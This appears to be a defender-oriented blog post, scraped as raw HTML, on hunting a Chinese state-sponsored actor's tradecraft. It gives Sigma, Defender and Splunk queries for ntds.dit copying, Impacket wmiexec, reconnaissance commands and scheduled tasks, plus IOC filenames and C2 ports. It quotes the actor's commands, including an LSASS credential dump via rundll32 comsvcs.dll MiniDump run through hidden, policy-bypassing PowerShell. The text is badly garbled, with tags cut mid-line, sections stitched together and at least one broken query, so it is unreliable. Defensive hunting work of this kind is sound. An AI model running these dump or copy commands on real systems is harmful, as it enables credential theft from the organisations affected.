gv nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">Analytic 1 — Command line attempt to access or create a copy of ntds.dit file</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="b705" class="pb mu gv oy b bg pc pd l pe pf">`suspicious_command = filter command_execution where ( (event_id = “4688” OR event_id = “1” OR event_id = “800”) AND ((command_line = “*ntds*” AND command_line = “*ntdsutil*” AND command_line = “*create*”) OR (command_line = “**vssadmin” AND command_line = “*create*” AMD command_line = “*shadow*”) OR (command_line = “*copy*” AND command_line = “*ntds.dit*”)) `</span></pre><h2 id="b827" class="mt mu gv bf mv mw mx dy my mz na ea nb nc nd ne nf ng nh ni nj nk nl nm nn no bk">File Access</h2><p id="1268" class="pw-post-body-paragraph np nq gv nr b ht ns nt nu hw nv nw nx nc ny nz oa ng ob oc od nk oe of og oh go bk">Monitor for access or copy of the NTDS.dit.</p><blockquote class="oi oj ok"><p id="cd29" class="np nq ol nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">Note: Events 4656 and 4663 (Microsoft Windows Security Auditing) provide context of processes and users requesting access or accessing file objects (ObjectType = File) such as C:\Windows\NTDS\ntds.dit. It is important to note that, in order to generate these events, a System Access Control List (SACL) must be defined for the ntds.dit file. Access rights that allow read operations on file objects and its attributes are %%4416 Read file data, %%4419 Read extended file attributes, %%4423 Read file attributes. If you search for just the name of the file and not the entire directory, you may get access events related to the ntds.dit file within a snapshot or volume shadow copy.</p><p id="f3f8" class="np nq ol nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">Events 4656 and 4663 (Microsoft Windows Security Auditing) provide context of processes and users creating or copying file objects (ObjectType = File) such as C:\Windows\NTDS\ntds.dit. It is important to note that, in order to generate these events, a System Access Control List (SACL) must be defined for the ntds.dit file. In order to filter file creation events, filter access rigths %%4417 Write data to the file and %%4424 Write file attributes.</p><p id="2485" class="np nq ol nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">Event 11 (Microsoft Windows Sysmon) provide context of processes and users creating or copying files. Unfortunately, this event provides context of the file being created or copied, but not the file being copied. A good starting point would be to look for new files created or copied with extension .dit.</p></blockquote><p id="fccb" class="pw-post-body-paragraph np nq gv nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">Analytic 1</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="f70b" class="pb mu gv oy b bg pc pd l pe pf">`suspicious_file = filter file_access where ((event_id = “4656” OR event_id = “4663”) AND (object_type = “File”) AND (file_name = “*ntds.dit*”) AND (access_list = “*%%4416*” OR access_list = “*%%4419*” OR access_list = “*%%4416*”)`</span></pre><p id="ac8c" class="pw-post-body-paragraph np nq gv nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">Analytic 2</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="fdcf" class="pb mu gv oy b bg pc pd l pe pf">`suspicious_file = filter file_access where ((event_id = “4656” OR event_id = “4663”) AND (object_type = “File”) AND (file_name = “*ntds.dit*”) AND (access_list = “*%%4417*” OR access_list = “*%%4424*”)`</span></pre><p id="9b45" class="pw-post-body-paragraph np nq gv nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">Analytic 3</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="851e" class="pb mu gv oy b bg pc pd l pe pf">`suspicious_file = filter file_access where ((event_id = “11”) AND (file_name = “*.dit”) `</span></pre><div class="pg ph pi pj pk pl"><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/file/file_event/file_event_win_ntds_dit_creation.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="pm ab jf"><div class="pn ab co cb po pp"><h2 class="bf gw iw z pq pr ps pt pu pv pw gu bk">sigma/rules/windows/file/file_event/file_event_win_ntds_dit_creation.yml at master · SigmaHQ/sigma</h2><div class="px l"><h3 class="bf b iw z pq pr ps pt pu pv pw du">Main Sigma Rule Repository. Contribute to SigmaHQ/sigma development by creating an account on GitHub.</h3></div><div class="py l"><p class="bf b dv z pq pr ps pt pu pv pw du">github.com</p></div></div><div class="pz l"><div class="qr l qb qc qd pz qe ma pl"></div></div></div></a></div><p id="9716" class="pw-post-body-paragraph np nq gv nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">Hunting Translation Microsoft Defender — Keep it simple</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="2426" class="pb mu gv oy b bg pc pd l pe pf">DeviceFileEvents | where FolderPath endswith @’ntds.dit’</span></pre><p id="5e0d" class="pw-post-body-paragraph np nq gv nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">Hunting Translation Splunk — Keep it simple</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="b869" class="pb mu gv oy b bg pc pd l pe pf">index=* source=”WinEventLog:*” AND TargetFilename=”*ntds.dit”</span></pre><h2 id="784a" class="mt mu gv bf mv mw mx dy my mz na ea nb nc nd ne nf ng nh ni nj nk nl nm nn no bk">Impacket</h2><p id="a78f" class="pw-post-body-paragraph np nq gv nr b ht ns nt nu hw nv nw nx nc ny nz oa ng ob oc od nk oe of og oh go bk">The actor regularly employs the use of Impacket’s wmiexec, which redirects output to a file within the victim host’s ADMIN$ share (<strong class="nr gw">C:\Windows\</strong>) containing an epoch timestamp in its name. The following is an example of the “<strong class="nr gw">dir</strong>” command being executed by <strong class="nr gw">wmiexec.py</strong></p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="0723" class="pb mu gv oy b bg pc pd l pe pf">cmd.exe /Q /c dir 1&gt; \\127.0.0.1\ADMIN$\__1684956600.123456 2&gt;&amp;1</span></pre><p id="35f9" class="pw-post-body-paragraph np nq gv nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">Note: Discovery of an entry similar to the example above in the Windows Event Log and/or a file with a name in a similar format may be evidence of malicious activity and should be investigated further. In the event that only a filename is discovered, the epoch timestamp within the filename reflects the time of execution by default and can be used to help scope threat hunting activities.</p><h1 id="964c" class="qs mu gv bf mv qt qu hv my qv qw hy nb qx qy qz ra rb rc rd re rf rg rh ri rj bk">Additional IOC PRC</h1><p id="5bb7" class="pw-post-body-paragraph np nq gv nr b ht ns nt nu hw nv nw nx nc ny nz oa ng ob oc od nk oe of og oh go bk">Hardcoded C2 Callbacks with port 80880,8443,8043,800,10443, with various filenames</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="9213" class="pb mu gv oy b bg pc pd l pe pf">cisco_up.exe,</span></pre><pre class="qf ox oy oz bp pa bb bk"><span id="efeb" class="pb mu gv oy b bg pc pd l pe pf">cl64.exe,</span></pre><pre class="qf ox oy oz bp pa bb bk"><span id="97a8" class="pb mu gv oy b bg pc pd l pe pf">vm3dservice.exe,</span></pre><pre class="qf ox oy oz bp pa bb bk"><span id="5073" class="pb mu gv oy b bg pc pd l pe pf">watchdogd.exe,</span></pre><pre class="qf ox oy oz bp pa bb bk"><span id="105c" class="pb mu gv oy b bg pc pd l pe pf">Win.exe,</span></pre><pre class="qf ox oy oz bp pa bb bk"><span id="0219" class="pb mu gv oy b bg pc pd l pe pf">WmiPreSV.exe, and</span></pre><pre class="qf ox oy oz bp pa bb bk"><span id="0c91" class="pb mu gv oy b bg pc pd l pe pf">WmiPrvSE.exe</span></pre><h2 id="e91e" class="mt mu gv bf mv mw mx dy my mz na ea nb nc nd ne nf ng nh ni nj nk nl nm nn no bk">Enumeration all</h2><p id="a325" class="pw-post-body-paragraph np nq gv nr b ht ns nt nu hw nv nw nx nc ny nz oa ng ob oc od nk oe of og oh go bk">The following commands were used by the actor to enumerate the network topology [T1016], the active directory structure [T1069.002], and other information about the target environment [T1069.001], [T1082]:</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="71e7" class="pb mu gv oy b bg pc pd l pe pf">arp -a</span></pre><pre class="qf ox oy oz bp pa /enumrecords /zone {REDACTED}</span></pre><pre class="qf ox oy oz bp pa bb bk"><span id="8ac0" class="pb mu gv oy b bg pc pd l pe pf">dnscmd . /enumzones</span></pre><pre class="qf ox oy oz bp pa bb class="qf ox oy oz bp pa bb bk"><span id="c4b1" class="pb mu gv oy b bg pc pd l pe pf">netsh firewall show all</span></pre><pre class="qf ox oy oz bp pa bb bk"><span id="6383" class="pb mu gv oy b bg gv oy b bg pc pd l pe pf">DeviceProcessEvents | where (ProcessCommandLine contains @’ipconfig /all’ or ProcessCommandLine contains @’netsh interface show interface’ or ProcessCommandLine contains @’arp -a’ or ProcessCommandLine contains @’nbtstat -n’ or ProcessCommandLine contains @’net config’ or ProcessCommandLine contains @’route print’)</span></pre><h2 id="43c2" class="mt mu gv bf mv mw mx dy my mz na ea nb nc nd ne nf ng nh ni nj nk nl nm nn no bk">Credential Theft</h2><p id="128d" class="pw-post-body-paragraph np nq gv nr b ht ns nt nu hw nv nw nx nc ny nz oa ng ob oc od nk oe of og oh go bk">The actor also used the following commands to identify additional opportunities for obtaining credentials in the environment [T1555], [T1003]:</p><pre class="os ot ou ov ow ox oy oz bp pa bb (with asterisks for wildcards) can be used to identify potentially malicious commands:</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="08ee" class="pb mu gv oy b bg pc pd l pe windowstyle hidden</span></pre><h2 id="bdf7" class="mt mu gv bf mv mw mx dy my mz na ea nb nc nd ne nf ng nh ni nj nk nl nm nn no bk">File paths</h2><p id="1b21" class="pw-post-body-paragraph np nq gv randomly created, in the following format have also been discovered: C:\Windows\[a-zA-Z]{8}.exe</p><h2 id="f898" class="mt mu gv bf mv mw mx dy my mz na ea nb nc nd ne nf ng nh ni nj nk nl nm nn no was identified performing reconnaissance activities by this actor:</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="0dd0" class="pb mu gv oy b bg pc pd l pe pf">Mozilla/5.0 (Windows NT spacing between “)” and “Gecko” is 3 tabs followed by 4 spaces.</p><h2 id="41a8" class="mt mu gv bf mv mw mx dy my mz na ea nb nc nd ne nf ng nh ni nj nk nl nm nn no bk">RUNDLL32</h2><blockquote class="oi oj ok"><p id="e65c" class="np nq ol nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">Chinese state-sponsored cyber actors were observed using Microsoft signed binaries, such as Rundll32, as a proxy to execute malicious payloads. Monitor processes for the execution of known proxy binaries (e.g., rundll32.exe) and look for anomalous activity that does not follow historically good arguments and loaded DLLs associated with the invocation of the binary.</p></blockquote><h2 id="f5b1" class="mt mu gv bf mv mw mx dy my mz na ea nb nc nd ne nf ng nh ni nj nk nl nm nn no bk">LSASS T1003.001</h2><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="5120" class="pb mu gv oy b bg pc pd l pe pf">cmd.exe /c powershell -exec bypass -W hidden -nop -E rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 552 C:\Windows\Temp\vmware-vhost.dmp full</span></pre><div class="pg ph pi pj pk pl"><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_access/proc_access_win_lsass_dump_comsvcs_dll.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="pm ab jf"><div class="pn ab co cb po pp"><h2 class="bf gw iw z pq pr ps pt pu pv pw gu bk">sigma/rules/windows/process_access/proc_access_win_lsass_dump_comsvcs_dll.yml at master ·…</h2><div class="px l"><h3 class="bf b iw z pq pr ps pt pu pv pw du">Main Sigma Rule Repository. contains @’vault::’))</span></pre><h2 id="86b9" class="mt mu gv bf mv mw mx dy my mz na ea nb nc nd ne nf ng nh ni nj nk nl nm nn no bk">Schtask</h2><blockquote class="oi oj ok"><p id="03ba" class="np nq ol nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">Chinese state-sponsored cyber actors have been observed using Cobalt Strike, webshells, or command line interface tools, such as schtask or crontab to create and schedule tasks that enumerate victim devices and networks. Note: this technique also applies to Persistence [TA0003] and Privilege Escalation [TA0004]. Monitor scheduled task creation from common utilities using command-line invocation and compare for any changes that do not correlate with known software, patch cycles, or other administrative activity. Configure event logging for scheduled task creation and monitor process execution from <strong class="nr gw">svchost.exe (Windows 10) and Windows Task Scheduler </strong>(Older version of Windows) to look for changes in <strong class="nr gw">%systemroot%\System32\Tasks</strong> that do not correlate with known software, patch cycles, or other administrative activity. Additionally monitor for any <strong class="nr gw">scheduled tasks created</strong> <em class="gv">via command line utilities</em> — such as <strong class="nr gw">PowerShell</strong> or <strong class="nr gw">Windows Management Instrumentation (WMI)</strong> — that do not conform to typical administrator or user actions.</p></blockquote><div class="pg ph pi pj pk pl"><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_schtasks_creation.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="pm ab jf"><div class="pn ab co cb po pp"><h2 class="bf gw iw z pq pr ps pt pu pv pw gu bk">sigma/rules/windows/process_creation/proc_creation_win_schtasks_creation.yml at master ·…</h2><div class="px l"><h3 class="bf b iw z pq pr ps pt pu pv pw du">Main Sigma Rule Repository. Contribute to SigmaHQ/sigma development by creating an account on GitHub.</h3></div><div class="py l"><p class="bf b dv z pq pr ps pt pu pv pw du">github.com</p></div></div><div class="pz l"><div class="rs l qb qc qd pz qe ma pl"></div></div></div></a></div><p id="0fe3" class="pw-post-body-paragraph np nq gv nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">MDE:</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="58f7" class="pb mu gv oy b bg pc pd l pe pf">DeviceProcessEvents | where ((FolderPath endswith @’\schtasks.exe’ and ProcessCommandLine contains @’ /create ‘) and not (((InitiatingProcessAccountName contains @’AUTHORI’ or InitiatingProcessAccountName contains @’AUTORI’) or (InitiatingProcessAccountDomain contains @’AUTHORI’ or InitiatingProcessAccountDomain contains @’AUTORI’))))</span></pre><p id="db83" class="pw-post-body-paragraph np nq gv nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">Splunk:</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="3877" class="pb mu gv oy b bg pc pd l pe pf">index=* source=”WinEventLog:*” AND ((Image=”*\\schtasks.exe” AND CommandLine=”* /create *”) AND NOT (User=”*AUTHORI*” OR User=”*AUTORI*”)) | table CommandLine,ParentCommandLine</span></pre><div class="pg ph pi pj pk pl"><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/builtin/taskscheduler/win_taskscheduler_lolbin_execution_via_task_scheduler.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="pm ab jf"><div class="pn ab co cb po pp"><h2 class="bf gw iw z pq pr ps pt pu pv pw gu bk">sigma/rules/windows/builtin/taskscheduler/win_taskscheduler_lolbin_execution_via_task_scheduler.yml…</h2><div class="px l"><h3 class="bf b iw z pq pr ps pt pu pv pw du">Main Sigma Rule Repository. Contribute to SigmaHQ/sigma development by creating an account on GitHub.</h3></div><div class="py l"><p class="bf b dv z pq pr ps pt pu pv pw du">github.com</p></div></div><div class="pz l"><div class="ru l qb qc qd pz qe ma pl"></div></div></div></a></div><p id="7764" class="pw-post-body-paragraph np nq gv nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go OriginalFileName=”schtasks.exe”) AND CommandLine=”*/Create*” AND (CommandLine=”*FromBase64String*” OR CommandLine=”*encodedcommand*”) AND (CommandLine=”*Get-ItemProperty*” OR CommandLine=”* gp *”) AND (CommandLine=”*HKCU:*” OR CommandLine=”*HKLM:*” OR CommandLine=”*registry::*” OR CommandLine=”*HKEY_*”))</span></pre><p id="0365" class="pw-post-body-paragraph np nq gv nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">MDE</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="93c3" class="pb mu gv oy b bg pc pd l pe pf">DeviceProcessEvents | where ((FolderPath endswith @’\schtasks.exe’ or InitiatingProcessVersionInfoOriginalFileName =~ @’schtasks.exe’ or ProcessVersionInfoOriginalFileName =~ @’schtasks.exe’) and ProcessCommandLine contains @’/Create’ and (ProcessCommandLine contains @’FromBase64String’ or ProcessCommandLine contains @’encodedcommand’) and (ProcessCommandLine contains @’Get-ItemProperty’ or ProcessCommandLine contains @’ gp ‘) and Note: Using port proxies is not common for legitimate system administration since they can constitute a backdoor into the network that bypasses firewall policies. Defenders should also use unusual IP addresses and ports in the command lines or registry entries to identify other hosts that are potentially included in actor actions. All hosts on the network should be examined for new and unusual firewall and port forwarding rules, as well as IP addresses and ports specified by the actor. Event ID 4624 is logged when a user successfully logs on to a host and contains useful information such as the logon type (e.g., interactive or networking), associated user and computer account names, and the logon time. Event ID 4624 entries can be viewed in Windows Event Viewer by navigating to: Windows Logs | Security. PowerShell logs can be viewed in Event Viewer: Applications and Service Logs | Windows PowerShell. This command identifies what user account they are currently leveraging to access the network, identify other users logged on to the host, or identify how their actions are being logged. If the actor is using a password spray technique [T1110.003], there may be several failed logon (Event ID 4625) events for several different user accounts, followed by one or more successful logons (Event ID 4624) within a short period of time. This period may vary by actor but can range from a few seconds to a few minutes. If the actor is using brute force password attempts [T1110] against a single user account, there may be several Event ID 4625 entries for that account, followed by a successful logon Event ID 4624. The command line version of WMI is called WMIC. By default, WMI Tracing is not enabled, so the WMI commands being executed and the associated user might not be available.
